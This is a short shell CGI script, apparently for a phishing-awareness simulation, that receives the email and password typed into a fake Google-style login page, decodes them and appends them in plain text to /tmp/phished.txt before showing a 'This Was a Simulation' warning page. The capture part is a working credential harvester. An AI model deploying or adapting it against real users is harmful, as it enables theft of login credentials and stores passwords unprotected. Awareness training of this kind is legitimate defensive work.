#!/bin/sh

echo "Content-type: text/html"
echo ""

# Read POST data
read -n $CONTENT_LENGTH POST_DATA

# --- Debugging: Log raw POST data (Optional) ---
# echo "DEBUG - POST_DATA: [$POST_DATA]" >> /tmp/phish_debug.log
# echo "DEBUG - CONTENT_LENGTH: [$CONTENT_LENGTH]" >> /tmp/phish_debug.log
# ---

# Extract data using sed (more portable)
# Extracts the value part after 'email=' and before '&' or end of string
EMAIL_RAW=$(echo "$POST_DATA" | sed -n 's/^.*email=\([^&]*\).*$/\1/p')
# Extracts the value part after 'password=' and before '&' or end of string
PASSWORD_RAW=$(echo "$POST_DATA" | sed -n 's/^.*password=\([^&]*\).*$/\1/p')

# --- Debugging: Log extracted raw values (Optional) ---
# echo "DEBUG - EMAIL_RAW: [$EMAIL_RAW]" >> /tmp/phish_debug.log
# echo "DEBUG - PASSWORD_RAW: [$PASSWORD_RAW]" >> /tmp/phish_debug.log
# ---

# Decode URL encoding (+ becomes space, %XX becomes character)
# Use printf '%b' for %XX decoding AFTER replacing + with space for simplicity
EMAIL=$(echo "$EMAIL_RAW" | sed 's/+/ /g')
EMAIL=$(printf '%b' "${EMAIL//%/\\x}")

PASSWORD=$(echo "$PASSWORD_RAW" | sed 's/+/ /g')
PASSWORD=$(printf '%b' "${PASSWORD//%/\\x}")

# --- Debugging: Log decoded values (Optional) ---
# echo "DEBUG - EMAIL: [$EMAIL]" >> /tmp/phish_debug.log
# echo "DEBUG - PASSWORD: [$PASSWORD]" >> /tmp/phish_debug.log
# ---

# Save to file
echo "Email: $EMAIL | Password: $PASSWORD | Timestamp: $(date)" >> /tmp/phished.txt

# Show awareness message (keep this part as is)
cat <<EOF
<html>
  <head><title>Security Alert</title></head>
  <body style="font-family: sans-serif; text-align: center; padding-top: 100px;">
    <h1 style="color: red;">This Was a Simulation</h1>
    <p>You just entered your credentials into a fake login page.</p>
    <p>This is exactly how phishing attacks work.</p>
    <p><strong>Never trust public Wi-Fi or suspicious login pages.</strong></p>
    <p><a href="/google.html">Back to fake login</a></p> </body>
</html>
EOF